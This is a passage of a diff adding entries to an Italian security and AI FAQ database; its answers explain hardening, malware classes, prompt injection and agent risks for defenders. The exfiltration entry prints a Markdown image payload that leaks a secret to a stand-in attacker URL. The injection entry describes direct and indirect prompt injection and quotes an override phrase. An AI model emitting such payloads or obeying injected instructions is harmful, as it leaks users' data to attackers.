la **ricostruzione da zero** del dominio – la fiducia, una volta persa a quel livello, è difficilissima da ripristinare con certezza. È il motivo per cui la [prevenzione architetturale](q/attacchi-active-directory-kerberoasting/) (tiering, [PAM](q/pam-e-accesso-just-in-time/), [detection](q/detection-engineering-e-event-id/) sugli accessi anomali) conta più di qualsiasi piano di risposta: qui il piano B è dolorosissimo."
+      ]
+    },
+    {
+      "id": "crisis-communication",
+      "slug": "comunicazione-di-crisi-cyber",
+      "question": "Come si gestisce la comunicazione di crisi in un incidente cyber?",
+      "vertical": "security",
+      "keywords": [
+        "comunicazione di crisi",
+        "gestione crisi",
+        "divulgazione controllata",
+        "comunicato incidente",
+        "cosa dire dopo un attacco",
+        "pr incidente",
+        "informare clienti breach",
+        "trasparenza incidente"
+      ],
+      "answers": [
+        "In un incidente, ciò che *dici* (e a chi, e quando) conta quanto ciò che fai tecnicamente: una comunicazione sbagliata trasforma un problema di sicurezza in una crisi reputazionale e legale. I principi:\n\n- **canali fuori banda**: comunica su sistemi *non* compromessi – l'attaccante potrebbe leggere l'email aziendale mentre pianifichi la risposta\n- **non compromettere l'indagine**: dettagli pubblicati troppo presto avvisano l'attaccante di cosa sai; ma il silenzio prolungato distrugge la fiducia più del danno – è un equilibrio da gestire con il legale\n- **rispetta gli obblighi di legge**: la [notifica al Garante entro 72 ore](q/notifica-data-breach-garante/) e agli interessati se il rischio è alto, i termini [NIS2/ACN](q/nis2-chi-deve-adeguarsi-italia/) – questi *non sono* scelte di PR, sono doveri\n- **una voce sola, coordinata**: un portavoce, messaggi allineati verso dipendenti, clienti, autorità, stampa – le versioni contraddittorie sono benzina\n- **onestà misurata**: dire ciò che si sa con certezza, ammettere ciò che non si sa ancora, non promettere ciò che non puoi garantire. Le aziende che hanno gestito bene un breach sono spesso quelle che hanno comunicato *presto e onestamente*; quelle che hanno minimizzato o nascosto hanno pagato molto di più\n\nÈ una fase da preparare **prima** – template, ruoli, decisori, contatti – ed è esattamente ciò che un [tabletop exercise](q/tabletop-exercise-simulazione-crisi/) mette alla prova. La comunicazione di crisi è parte dell'[incident response](q/fasi-incident-response-nist/), non un'appendice."
+      ]
+    },
+    {
+      "id": "secure-boot",
+      "slug": "secure-boot-personalizzato-chiavi-proprie",
+      "question": "Cos'è Secure Boot (e come si registrano chiavi proprie)?",
+      "vertical": "security",
+      "keywords": [
+        "secure boot",
+        "avvio sicuro",
+        "uefi",
+        "chiavi secure boot",
+        "pk kek db",
+        "bootkit protezione",
+        "shim",
+        "firma bootloader",
+        "mok"
+      ],
+      "answers": [
+        "**Secure Boot** è la funzione UEFI che verifica la **firma crittografica** di ogni componente della catena di avvio – bootloader, kernel, driver – prima di eseguirlo: se un [bootkit](q/cos-e-un-rootkit-e-un-bootkit/) ha manomesso il bootloader, la firma non torna e l'avvio si blocca. È la radice di fiducia (*root of trust*) da cui dipende ogni difesa sopra: un sistema bucato *sotto* il kernel non è difendibile *dal* kernel.\n\nLa gerarchia delle chiavi: **PK** (Platform Key, la master del produttore), **KEK** (Key Exchange Keys) e **db** (il database delle firme autorizzate) più **dbx** (quelle revocate). Di fabbrica sono precaricate le chiavi Microsoft, motivo per cui Linux usa uno **shim** firmato da Microsoft per avviarsi.\n\nPer chi vuole controllo totale (e non fidarsi delle chiavi di terzi), si possono **registrare chiavi proprie**: rimpiazzare PK/KEK/db con le tue, firmare tu stesso kernel e bootloader (i **MOK**, Machine Owner Keys, permettono di aggiungere chiavi senza cancellare tutto). È hardening avanzato – utile con dischi cifrati e [firmware ispezionabile](q/secure-element-vs-firmware-aperto/) per una catena di fiducia interamente tua – ma va fatto con attenzione: una chiave sbagliata e la macchina non avvia. Il complemento naturale: [cifratura del disco](q/sicurezza-fisica-dei-server/) e [misura del boot](q/cos-e-un-air-gap/) per l'assurance completa."
+      ]
+    },
+    {
+      "id": "usbguard",
+      "slug": "usbguard-bloccare-badusb",
+      "question": "Come si blocca un attacco BadUSB (USBGuard)?",
+      "vertical": "security",
+      "keywords": [
+        "usbguard",
+        "badusb",
+        "attacco usb",
+        "chiavetta malevola",
+        "rubber ducky",
+        "hid injection",
+        "bloccare usb",
+        "dispositivi usb non autorizzati",
+        "keystroke injection"
+      ],
+      "answers": [
+        "Un attacco **BadUSB** sfrutta la fiducia cieca del sistema nei dispositivi USB: una chiavetta (o un cavo, o un finto caricatore – i **Rubber Ducky** e simili) che si dichiara **tastiera** e, appena inserita, \"digita\" a velocità sovrumana una sequenza di comandi che aprono una shell, scaricano malware, esfiltrano. Il sistema vede una tastiera legittima, non un'arma – ed è per questo che \"non aprire file sospetti\" non basta: qui non si apre nulla, basta collegare.\n\n**USBGuard** (Linux) mette una policy di autorizzazione tra il dispositivo e il sistema: solo i dispositivi USB **esplicitamente permessi** (per attributi hardware) vengono attivati; un dispositivo nuovo o inatteso resta bloccato finché non lo autorizzi. Neutralizza il BadUSB (la finta tastiera non viene attivata) e in generale l'inserimento non autorizzato.\n\nLe difese complementari: sui laptop privacy, i [kill-switch/blocco fisico delle porte](q/kill-switch-hardware-privacy/); su Windows, le policy di restrizione dei dispositivi; e la regola comportamentale che nessun tool sostituisce – **non collegare mai USB trovate o non fidate** (la chiavetta \"persa\" nel parcheggio è un vettore d'attacco documentato). È hardening dell'endpoint fisico, parente della [sicurezza fisica del server](q/sicurezza-fisica-dei-server/): il confine tra digitale e fisico è dove molte difese software finiscono."
+      ]
+    },
+    {
+      "id": "ebpf-security",
+      "slug": "ebpf-osservabilita-e-sicurezza-kernel",
+      "question": "Cos'è eBPF (e come abilita sicurezza e osservabilità a livello kernel)?",
+      "vertical": "security",
+      "keywords": [
+        "ebpf",
+        "extended berkeley packet filter",
+        "kernel osservabilita",
+        "falco",
+        "cilium",
+        "tetragon",
+        "tracing kernel",
+        "runtime security",
+        "monitoraggio kernel",
+        "syscall monitoring"
+      ],
+      "answers": [
+        "**eBPF** permette di eseguire programmi sandboxati **dentro il kernel Linux** in sicurezza, senza scrivere moduli kernel (rischiosi) né ricompilare nulla: agganci un piccolo programma verificato a un evento del kernel – una syscall, un pacchetto di rete, l'esecuzione di un processo – e osservi o intervieni. È una delle innovazioni più importanti del Linux moderno, e ha rivoluzionato tre campi:\n\n- **osservabilità di sicurezza**: vedi *tutto* ciò che accade a livello kernel – ogni processo lanciato, ogni connessione, ogni file aperto – con overhead minimo. **Falco** e **Tetragon** costruiscono su eBPF il rilevamento di comportamenti anomali a runtime (l'ideale contro il [Living-off-the-Land](q/cos-e-un-attacco-living-off-the-land/) e le [container escape](q/sicurezza-delle-immagini-container/))\n- **rete e sicurezza**: **Cilium** implementa networking, load balancing e policy per Kubernetes in eBPF\n- **enforcement**: non solo osservare ma *bloccare* – filtrare syscall, negare azioni\n\nPerché è potente per la difesa: opera a un livello **sotto** l'applicazione e il container, quindi vede ciò che tenta di nascondersi, ed è difficilissimo da eludere restando nel kernel. È l'infrastruttura dietro l'[EDR](q/differenza-edr-xdr-antivirus/) moderno su Linux e la [detection](q/detection-engineering-e-event-id/) a runtime. Il rovescio: la potenza di eBPF lo rende anche una superficie da presidiare – programmi eBPF malevoli esistono, e chi può caricarli va [ristretto](q/principio-del-minimo-privilegio/)."
+      ]
+    },
+    {
+      "id": "app-sandboxing",
+      "slug": "isolamento-applicazioni-flatpak-snap-firejail",
+      "question": "Isolamento delle applicazioni: Flatpak, Snap, container, Firejail?",
+      "vertical": "security",
+      "keywords": [
+        "flatpak",
+        "snap",
+        "firejail",
+        "bubblewrap",
+        "sandbox applicazioni",
+        "isolare app linux",
+        "appimage",
+        "sandboxing desktop",
+        "permessi app linux",
+        "portali"
+      ],
+      "answers": [
+        "Sul desktop Linux, un'applicazione gira storicamente con **tutti i permessi dell'utente** – può leggere i tuoi documenti, le chiavi SSH, tutto. Il **sandboxing applicativo** confina ogni app in un recinto di permessi minimi. Le tecnologie, con filosofie diverse:\n\n- **Flatpak** – il più adottato per il desktop: le app girano isolate, con accesso a file e risorse mediato dai **portali** (l'app chiede \"posso aprire un file?\" e il sistema mostra il selettore – l'app vede *solo* ciò che scegli). I permessi sono ispezionabili e restringibili (Flatseal)\n- **Snap** – simile, con confinamento AppArmor; ecosistema Canonical\n- **Firejail / bubblewrap** – sandbox leggere che confinano *qualsiasi* eseguibile (anche app di sistema) con namespace e seccomp – più manuali, molto flessibili. bubblewrap è il motore sotto Flatpak\n\nLa distinzione con i [container](q/sicurezza-delle-immagini-container/): questi isolano *applicazioni desktop* per l'utente, i container isolano *servizi*. Entrambi condividono il kernel (a differenza delle [VM](q/differenza-container-lxc-e-vm/)), quindi l'isolamento non è perfetto – ma alza molto il costo di un'app compromessa o troppo curiosa. La pratica sana: preferire Flatpak per il software di terze parti, controllarne e restringerne i permessi (perché quel lettore PDF vuole l'accesso alla rete?), e [MTE](q/cos-e-memory-tagging-extension-mte/)/hardening del sistema sotto. È [minimo privilegio](q/principio-del-minimo-privilegio/) applicato alle app che lanci ogni giorno."
+      ]
+    },
+    {
+      "id": "mte",
+      "slug": "cos-e-memory-tagging-extension-mte",
+      "question": "Cos'è la Memory Tagging Extension (MTE)?",
+      "vertical": "security",
+      "keywords": [
+        "memory tagging",
+        "mte",
+        "memory safety",
+        "use after free",
+        "buffer overflow hardware",
+        "arm mte",
+        "corruzione memoria",
+        "vulnerabilita memoria",
+        "spatial safety"
+      ],
+      "answers": [
+        "La stragrande maggioranza delle vulnerabilità gravi (buffer overflow, use-after-free) nasce da **errori di gestione della memoria** in linguaggi come C/C++: codice che legge o scrive dove non dovrebbe. La **Memory Tagging Extension (MTE)** – nei processori ARM moderni – li intercetta *in hardware*: a ogni blocco di memoria allocato viene assegnato un **tag** (un piccolo numero), e ogni puntatore porta lo stesso tag; se un accesso usa un puntatore il cui tag non corrisponde a quello della memoria (perché è andato fuori dai limiti, o punta a memoria già liberata), l'hardware **blocca** l'operazione all'istante.\n\nÈ un cambio di paradigma: invece di *sperare* che il codice sia corretto o di trovare i bug uno a uno, l'hardware rende **la classe intera di attacchi** molto più difficile da sfruttare – trasforma una corruzione silenziosa (che l'attaccante sfrutta) in un crash controllato (che al massimo è un denial of service). GrapheneOS e Android lo sfruttano già; sta arrivando lato server.\n\nSi inserisce nel filone delle difese *strutturali* alla memory safety, insieme all'adozione di **linguaggi memory-safe** (Rust in testa – non a caso [proxxx, zion e i tool Rust del portfolio](q/cos-e-proxxx-cockpit-terminale-proxmox/) eliminano intere classi di bug per costruzione) e alle protezioni classiche (ASLR, DEP, stack canary). MTE non risolve tutto, ma alza drasticamente il costo dello sfruttamento – la stessa filosofia della [defense in depth](q/cos-e-la-defense-in-depth/): rendere l'attacco caro, non solo raro."
+      ]
+    },
+    {
+      "id": "security-baselines",
+      "slug": "security-baseline-e-automazione-hardening",
+      "question": "Come si automatizza l'hardening con baseline (CIS, Ansible)?",
+      "vertical": "security",
+      "keywords": [
+        "security baseline",
+        "cis benchmark",
+        "hardening automatico",
+        "ansible hardening",
+        "dev-sec",
+        "microsoft security baseline",
+        "stig",
+        "openscap",
+        "configurazione sicura automatica"
+      ],
+      "answers": [
+        "Fare [hardening](q/hardening-server-linux/) a mano su una macchina è fattibile; farlo su cento, in modo coerente e ripetibile, richiede automazione basata su **baseline** – standard di configurazione sicura scritti da esperti:\n\n- **CIS Benchmark** – i riferimenti più usati: liste dettagliate di impostazioni sicure per OS, browser, cloud, database, con livelli (L1 pratico, L2 restrittivo)\n- **STIG** (versione governativa/militare USA), **Microsoft Security Baseline** (per Windows/AD)\n\nL'automazione li applica come **codice**:\n\n- **Ansible** con i ruoli **dev-sec** (`ansible-lockdown`, hardening OS/SSH/nginx): descrivi lo stato sicuro desiderato, Ansible lo *impone e riporta* su tutte le macchine\n- **OpenSCAP** – scansiona e verifica la conformità a una baseline (misura *quanto* sei allineato, in percentuale)\n\nI vantaggi: coerenza (nessuna macchina \"speciale\" configurata a mano e dimenticata), ripetibilità (una macchina nuova nasce già hardened), e **auditabilità** – la baseline è la prova documentata per [ISO 27001/NIS2](q/cos-e-iso-27001/) di *come* configuri i sistemi. È l'[Infrastructure as Code](q/cos-e-gitops/) applicato alla sicurezza: la configurazione vive in git, versionata e revisionabile. La cautela pratica: le baseline vanno **testate** prima (una regola L2 può rompere un'applicazione legittima) e adattate al contesto – applicare CIS alla cieca in produzione è un modo creativo di crearsi un incidente."
+      ]
+    },
+    {
+      "id": "rootkit-bootkit",
+      "slug": "cos-e-un-rootkit-e-un-bootkit",
+      "question": "Cos'è un rootkit (e un bootkit)?",
+      "vertical": "security",
+      "keywords": [
+        "rootkit",
+        "bootkit",
+        "malware kernel",
+        "malware invisibile",
+        "uefi malware",
+        "ring 0",
+        "nascondere malware",
+        "malware firmware",
+        "malware persistente"
+      ],
+      "answers": [
+        "Un **rootkit** è malware progettato per **nascondersi e mantenere l'accesso** operando ai livelli più profondi del sistema. Più in basso opera, più è invisibile e potente:\n\n- **user-mode** – aggancia le API per nascondere processi e file dall'occhio dei tool normali\n- **kernel-mode** (ring 0) – vive *dentro* il kernel: da lì può mentire a *qualsiasi* software di sicurezza che gira sopra (\"quel processo? non esiste\"). Difendere il sistema *dal* kernel, quando il kernel è compromesso, è quasi impossibile\n- **bootkit** – infetta il **bootloader** o l'**UEFI/firmware**: si carica *prima* del sistema operativo, quindi prima di ogni difesa, e sopravvive alla reinstallazione dell'OS e perfino alla sostituzione del disco (se è nel firmware)\n\nSono l'apice della persistenza furtiva. Le difese sono *sotto* il sistema operativo: **[Secure Boot](q/secure-boot-personalizzato-chiavi-proprie/)** (verifica la firma della catena di avvio – la barriera principale contro i bootkit), il **TPM** con measured boot, e per il rilevamento, l'[analisi della memoria](q/analisi-forense-della-memoria-ram/) da un ambiente esterno fidato (un rootkit può mentire dall'interno, ma un dump analizzato da fuori lo smaschera confrontando ciò che il sistema *dice* con ciò che *è*). Per i casi estremi, la fiducia si ricostruisce solo da hardware pulito. È il motivo per cui la [root of trust](q/secure-boot-personalizzato-chiavi-proprie/) hardware conta: se l'avvio è manomesso, tutto ciò che segue mente."
+      ]
+    },
+    {
+      "id": "polymorphic-malware",
+      "slug": "malware-polimorfico-e-offuscamento",
+      "question": "Cos'è il malware polimorfico (e le tecniche di offuscamento)?",
+      "vertical": "security",
+      "keywords": [
+        "malware polimorfico",
+        "polimorfico",
+        "metamorfico",
+        "offuscamento malware",
+        "packing",
+        "packer",
+        "evasione antivirus",
+        "crypter",
+        "firma malware evasione",
+        "steganografia payload"
+      ],
+      "answers": [
+        "Il **malware polimorfico** cambia il proprio aspetto a ogni copia o esecuzione, restando funzionalmente identico – proprio per **eludere il rilevamento basato su firme**: se ogni campione ha un hash diverso, la firma \"questo hash è malware\" non aggancia nulla. Le tecniche:\n\n- **polimorfismo** – cifra il payload con una chiave diversa ogni volta, più un piccolo decryptor che varia\n- **metamorfismo** – riscrive il *proprio codice* a ogni generazione (istruzioni equivalenti, ordine diverso): nessuna parte resta costante\n- **packing/crypting** – comprime e cifra l'eseguibile, che si decomprime in memoria all'avvio (spesso con [reflective loading](q/process-injection-e-dll-sideloading/) per non toccare il disco)\n- **payload steganografici** – nascondere il codice malevolo dentro [immagini o file apparentemente innocui](q/cos-e-la-steganografia/)\n\nÈ la ragione per cui la difesa è migrata dalle firme al **comportamento**: per quanto cambi aspetto, il malware *deve* comunque fare le sue azioni (iniettarsi, chiamare il [C2](q/cos-e-una-botnet/), cifrare file), e quelle si rilevano. Le contromisure: [EDR](q/differenza-edr-xdr-antivirus/) comportamentale, analisi in **sandbox** (si detona il campione in un ambiente isolato e si osserva cosa fa – il polimorfismo non nasconde il comportamento), [detection](q/detection-engineering-e-event-id/) sulle azioni, ed euristiche sull'entropia (un file molto \"casuale\" è probabilmente cifrato/packed). È la corsa agli armamenti classica: ogni evasione genera una nuova tecnica di rilevamento."
+      ]
+    },
+    {
+      "id": "direct-indirect-injection",
+      "slug": "direct-e-indirect-prompt-injection",
+      "question": "Qual è la differenza tra Direct e Indirect Prompt Injection?",
+      "vertical": "ai",
+      "keywords": [
+        "direct prompt injection",
+        "indirect prompt injection",
+        "differenza prompt injection",
+        "injection diretta indiretta",
+        "attacco tramite documento",
+        "injection dai dati",
+        "prompt injection tipi"
+      ],
+      "answers": [
+        "Entrambe sono [prompt injection](q/cos-e-la-prompt-injection/) – far eseguire a un LLM istruzioni ostili – ma il *vettore* cambia tutto:\n\n- **Direct** – l'attaccante inserisce le istruzioni malevole **direttamente nel proprio input**: è l'utente stesso che cerca di jailbreakare il modello (\"ignora le regole e...\"). Il rischio è limitato a ciò che *quell'utente* potrebbe già fare – aggira i filtri, ma agisce con i propri permessi\n- **Indirect** – le istruzioni sono nascoste in **contenuto esterno che l'agente leggerà**: una pagina web, un'email, un PDF, un documento nella [knowledge base](q/sicurezza-del-rag-e-dei-vector-database/), un commento in un repository. La vittima è **un altro utente** (o un agente automatico) il cui assistente, leggendo quel contenuto, esegue le istruzioni dell'attaccante *con i permessi della vittima*\n\nÈ la Indirect la più pericolosa e la più difficile da difendere: l'attaccante non ha bisogno di accedere al tuo sistema, gli basta piazzare il payload dove il tuo agente andrà a leggere – e negli [agenti](q/cos-e-un-agente-ai/) che navigano, leggono email o documenti, la superficie è enorme. È il vettore dietro l'[esfiltrazione via canali laterali](q/esfiltrazione-dati-tramite-agenti-ai/) e i [confused deputy](q/sicurezza-dei-tool-e-plugin-mcp/). Le difese: trattare *ogni* contenuto esterno come [non fidato](q/sicurezza-del-rag-e-dei-vector-database/), separare istruzioni e dati, [guardrail](q/firewall-semantici-e-guardrail-runtime/), e soprattutto [permessi minimi + HITL](q/come-si-limita-un-agente-ai/) – se l'agente non *può* fare l'azione dannosa, l'injection che gliela ordina fallisce."
+      ]
+    },
+    {
+      "id": "model-inversion",
+      "slug": "model-inversion-e-membership-inference",
+      "question": "Cosa sono gli attacchi di Model Inversion e Membership Inference?",
+      "vertical": "ai",
+      "keywords": [
+        "model inversion",
+        "membership inference",
+        "estrazione dati modello",
+        "privacy modello",
+        "ricostruire dati training",
+        "attacco privacy ml",
+        "dati di addestramento",
+        "leak modello"
+      ],
+      "answers": [
+        "Due attacchi alla **privacy dei dati di addestramento** di un modello ML – perché un modello, in un certo senso, *ricorda* ciò su cui è stato addestrato, e questi attacchi lo estraggono:\n\n- **Membership Inference** – determinare se un *dato specifico faceva parte del training set*: interrogando il modello e osservando quanto è \"confidente\" o preciso su quel dato, si inferisce se l'ha visto in addestramento. Sembra astratto, ma se il dataset è \"pazienti con una certa malattia\", scoprire che Tizio *era nel training* rivela un'informazione sanitaria – un problema [GDPR](q/chatgpt-e-dati-personali-gdpr/) serio\n- **Model Inversion** – ricostruire *caratteristiche dei dati* di addestramento dalle risposte del modello: nei casi estremi, rigenerare approssimazioni di volti o record da un modello addestrato su di essi\n\nSono la ragione per cui **addestrare o fare fine-tuning su dati sensibili** non è mai neutro: il modello diventa un potenziale canale di fuga. Le difese: **privacy differenziale** (rumore matematico durante il training che rende impossibile risalire al singolo dato, con un costo in accuratezza), minimizzazione ([serve davvero quel dato personale?](q/gdpr-cosa-serve-a-un-sito-web/)), controllo degli accessi al modello, e per i dati davvero sensibili la scelta più sicura – [non metterli nel modello affatto](q/allucinazioni-llm-dipendenze-inventate/), ma fornirli a runtime via [RAG con permessi](q/sicurezza-del-rag-e-dei-vector-database/), dove restano cancellabili e governabili. È il lato privacy della [sicurezza AI](q/data-leakage-via-llm/): il modello non è solo codice, è anche un deposito dei dati che ha visto."
+      ]
+    },
+    {
+      "id": "nist-ai-rmf",
+      "slug": "nist-ai-risk-management-framework",
+      "question": "Cos'è il NIST AI Risk Management Framework?",
+      "vertical": "ai",
+      "keywords": [
+        "nist ai rmf",
+        "ai risk management",
+        "gestione rischio ai",
+        "framework rischio ai",
+        "govern map measure manage",
+        "owasp llm top 10",
+        "mitre atlas",
+        "standard sicurezza ai"
+      ],
+      "answers": [
+        "Il **NIST AI RMF** è un framework volontario per gestire i rischi dei sistemi AI lungo tutto il ciclo di vita – l'equivalente, per l'AI, di ciò che [ISO 27001](q/cos-e-iso-27001/) è per la sicurezza delle informazioni. Non è una legge (a differenza dell'[AI Act](q/cosa-prevede-ai-act/)) ma un metodo, organizzato in quattro funzioni: **Govern** (cultura, ruoli, policy sull'AI), **Map** (contesto e rischi del sistema), **Measure** (valutare e [misurare](q/come-valutare-le-risposte-di-un-llm/) i rischi – bias, robustezza, sicurezza), **Manage** (prioritizzare e trattare).\n\nSi affianca ad altri riferimenti dell'ecosistema che vale la pena conoscere:\n\n- **OWASP Top 10 for LLM** – i dieci rischi principali delle applicazioni LLM ([prompt injection](q/direct-e-indirect-prompt-injection/), [data leakage](q/data-leakage-via-llm/), [supply chain dei modelli](q/sicurezza-dei-pesi-e-checkpoint-dei-modelli/)...): la [OWASP Top 10](q/cos-e-la-owasp-top-10/) dell'era AI\n- **MITRE ATLAS** – la [matrice ATT&CK](q/cos-e-la-matrice-mitre-attack/) applicata agli attacchi ai sistemi AI\n\nPerché ti riguarda: mentre l'[AI Act](q/cosa-prevede-ai-act/) impone *cosa* fare per legge, questi framework danno il *come* operativo – e adottarli è il modo pratico di prepararsi alla conformità e di gestire davvero il rischio invece di firmare documenti. Per una PMI che introduce l'AI, sono la traccia da cui partire, insieme a una [AI policy](q/come-scrivere-una-ai-policy-aziendale/) e a controlli concreti come [guardrail](q/firewall-semantici-e-guardrail-runtime/) e [DLP](q/data-leakage-via-llm/)."
+      ]
+    },
+    {
+      "id": "ueba",
+      "slug": "cos-e-ueba-user-entity-behavior-analytics",
+      "question": "Cos'è l'UEBA (User and Entity Behavior Analytics)?",
+      "vertical": "ai",
+      "keywords": [
+        "ueba",
+        "user behavior analytics",
+        "uba",
+        "analisi comportamentale utenti",
+        "anomalie comportamento",
+        "machine learning sicurezza",
+        "baseline utente",
+        "rilevamento anomalie utenti"
+      ],
+      "answers": [
+        "L'**UEBA** applica il machine learning a un problema che le regole fisse non risolvono: distinguere il comportamento **normale** di ogni utente e sistema da quello **anomalo**. Invece di regole statiche (\"allarme se più di 100 download\" – che genera falsi positivi per chi scarica tanto per lavoro e ne perde altri sotto soglia), l'UEBA costruisce una **baseline individuale**: cosa è normale *per quella persona*, a quell'ora, da quel luogo – e segnala le deviazioni significative.\n\nGli scenari che coglie meglio delle regole: l'[account compromesso](q/cos-e-un-infostealer/) (l'utente \"si comporta\" diversamente all'improvviso – accede a sistemi mai visti, a orari strani, da geografie impossibili), l'[insider threat](q/cos-e-un-insider-threat/) (chi inizia a raccogliere dati fuori dal suo ruolo), il movimento laterale.\n\nIl valore rispetto alle regole fisse è duplice: **meno falsi positivi** (la baseline è personalizzata, non una soglia uguale per tutti – aiuta contro l'[alert fatigue](q/alert-fatigue-nel-soc/)) e **rilevamento del mai-visto** (le anomalie non hanno bisogno di una firma nota). È spesso integrato nei [SIEM/XDR](q/differenza-siem-soar-xdr/) moderni. Il limite onesto: come ogni ML, ha bisogno di dati di qualità e di un periodo di apprendimento, va tarato, e le sue anomalie sono *indizi* da investigare, non verdetti – e vanno gestite nel rispetto della [privacy dei lavoratori](q/gdpr-cosa-serve-a-un-sito-web/), che è un vincolo legale, non un dettaglio."
+      ]
+    },
+    {
+      "id": "runaway-agent",
+      "slug": "prevenire-il-runaway-agent-loop",
+      "question": "Come si previene il Runaway Agent Loop (loop infinito di un agente)?",
+      "vertical": "ai",
+      "keywords": [
+        "runaway agent",
+        "loop infinito agente",
+        "agente impazzito",
+        "ciclo ricorsivo tool",
+        "budget agente",
+        "limiti agente",
+        "agente costoso",
+        "loop di chiamate",
+        "circuit breaker agente"
+      ],
+      "answers": [
+        "Un **Runaway Agent Loop** è un [agente](q/cos-e-un-agente-ai/) che entra in un ciclo senza fine – chiama uno strumento, non ottiene il risultato sperato, riprova, richiama, all'infinito – bruciando [token e denaro](q/cos-e-l-inferenza-e-perche-costa/) (una bolletta API da migliaia di euro in una notte) o martellando un servizio esterno. È il denial-of-wallet degli agenti, spesso non malevolo ma dovuto a un obiettivo mal definito, un errore che non si risolve, o una [prompt injection](q/direct-e-indirect-prompt-injection/) che lo manda fuori strada.\n\nLe difese sono ingegneria di harness, non prompt:\n\n- **budget rigidi**: tetto massimo di iterazioni, di token, di tempo, di costo per task – superato il quale l'agente si ferma, punto\n- **circuit breaker**: rilevare le ripetizioni (la stessa azione con lo stesso risultato N volte) e interrompere – un agente che ripete non sta progredendo\n- **timeout e rate limit** sui tool, così un loop non travolge i servizi a valle\n- **[kill-switch](q/identita-degli-agenti-e-kill-switch/)** e monitoraggio dei costi in tempo reale ([observability](q/osservabilita-e-tracing-di-sistemi-ai/)) con alert sui picchi\n- **stato/[checkpoint](q/time-travel-debugging-agenti/)** che rende visibile e interrompibile il progresso\n\nÈ lo stesso principio del [determinismo nell'impalcatura](q/pattern-di-orchestrazione-agentica/): i limiti di controllo (loop, budget, retry) vanno **codificati nell'harness**, non affidati al giudizio del modello – un agente non deve *decidere* di fermarsi, deve *essere fermato* quando supera i limiti. Un buon workflow ha sempre un tetto; un cattivo agente lo scopre a bolletta arrivata."
+      ]
+    },
+    {
+      "id": "seccomp-gvisor",
+      "slug": "sandbox-syscall-seccomp-gvisor",
+      "question": "Come si filtrano le syscall pericolose (seccomp, gVisor)?",
+      "vertical": "ai",
+      "keywords": [
+        "seccomp",
+        "gvisor",
+        "syscall filtering",
+        "sandbox syscall",
+        "kata containers",
+        "isolamento kernel container",
+        "filtrare chiamate di sistema",
+        "runtime sicuro",
+        "isolamento agente esecuzione"
+      ],
+      "answers": [
+        "Quando esegui codice non fidato – [un agente AI che lancia comandi](q/cos-e-il-sandboxing-per-agenti/), un [container](q/sicurezza-delle-immagini-container/), codice generato – il rischio finale è che una **syscall** (la richiesta di un programma al kernel) faccia qualcosa di pericoloso o buchi l'isolamento (**container escape**). Gli strumenti che lo impediscono:\n\n- **seccomp** (secure computing mode) – filtra *quali syscall* un processo può fare: si definisce una allowlist (il container ha bisogno solo di queste 50 syscall, non di tutte le 300+), e ogni chiamata fuori lista viene bloccata. Riduce drasticamente la superficie del kernel esposta\n- **gVisor** – un approccio più radicale: un **kernel applicativo in user-space** che intercetta le syscall del carico e le gestisce lui, senza passarle direttamente al kernel reale. Isolamento molto più forte di un container normale, con un po' di overhead\n- **Kata Containers** – container che girano dentro **micro-VM** leggere: l'isolamento di una [VM](q/differenza-container-lxc-e-vm/) con l'ergonomia di un container\n\nLa scala di isolamento, dal più leggero al più forte: seccomp+namespace (container normale) → gVisor → micro-VM (Kata) → [VM piena](q/differenza-container-lxc-e-vm/). Più forte l'isolamento, più overhead: si sceglie in base a *quanto* è non fidato ciò che esegui. Per un [agente che esegue codice arbitrario](q/cos-e-il-sandboxing-per-agenti/), gVisor o micro-VM usa-e-getta sono la scelta prudente – più [egress chiuso](q/secure-web-gateway-self-hosted/) e [permessi minimi](q/come-si-limita-un-agente-ai/). È [defense in depth](q/cos-e-la-defense-in-depth/) al confine tra software e kernel."
+      ]
+    },
+    {
+      "id": "agent-exfiltration",
+      "slug": "esfiltrazione-dati-tramite-agenti-ai",
+      "question": "Come esfiltrano dati gli attacchi agli agenti AI (side-channel, Markdown)?",
+      "vertical": "ai",
+      "keywords": [
+        "esfiltrazione agente",
+        "data exfiltration llm",
+        "markdown injection",
+        "image exfiltration",
+        "canale laterale llm",
+        "esfiltrazione via immagine",
+        "rendering markdown attacco",
+        "furto dati agente",
+        "esfiltra dati un agente",
+        "agente via markdown"
+      ],
+      "answers": [
+        "Un agente compromesso via [indirect prompt injection](q/direct-e-indirect-prompt-injection/) deve poi *far uscire* i dati che ruba – e le vie sono più subdole di una connessione di rete evidente. I canali laterali documentati:\n\n- **rendering Markdown / immagini**: l'attaccante induce l'agente a generare un'immagine Markdown `![](https://server-attaccante.com/leak?dati=SEGRETO)` – quando l'interfaccia **renderizza** l'immagine, il browser della vittima fa la richiesta a quell'URL, **esfiltrando i dati nella query string**. La vittima vede solo un'immagine rotta; l'attaccante ha ricevuto il segreto. È uno degli attacchi più eleganti e ha colpito assistenti reali\n- **link cliccabili** con dati codificati nell'URL, che l'utente clicca inconsapevolmente\n- **chiamate a tool** legittimi piegate all'esfiltrazione (un tool che \"cerca sul web\" usato per spedire dati nella query)\n\nLe difese, a livello di prodotto e di architettura:\n\n- **sanitizzare l'output**: non renderizzare immagini/link verso domini arbitrari, allowlist dei domini, disabilitare il caricamento automatico di risorse esterne nelle risposte\n- **egress control** sui tool dell'agente ([niente chiamate verso domini non fidati](q/secure-web-gateway-self-hosted/))\n- **[permessi minimi](q/come-si-limita-un-agente-ai/)**: l'agente non deve avere accesso *sia* ai dati sensibili *sia* alla capacità di comunicare con l'esterno senza controlli\n\nÈ un promemoria che la sicurezza degli agenti non finisce al prompt: [ciò che l'agente legge](q/sicurezza-del-rag-e-dei-vector-database/) può ordinargli di agire, e [come il suo output viene renderizzato](q/firewall-semantici-e-guardrail-runtime/) può essere il canale di fuga. Superficie nuova, principi vecchi: valida gli input, controlla gli output, minimizza i privilegi."
+      ]
+    },
+    {
+      "id": "hardware-implants",
+      "slug": "impianti-hardware-e-firmware-malevolo",
+      "question": "Come si contrastano impianti hardware e firmware malevolo?",
+      "vertical": "security",
+      "keywords": [
+        "impianti hardware",
+        "hardware implant",
+        "firmware malevolo",
+        "intel me",
+        "me_cleaner",
+        "coreboot",
+        "supply chain hardware",
+        "bios malevolo",
+        "hardware compromesso",
+        "firmware backdoor"
+      ],
+      "answers": [
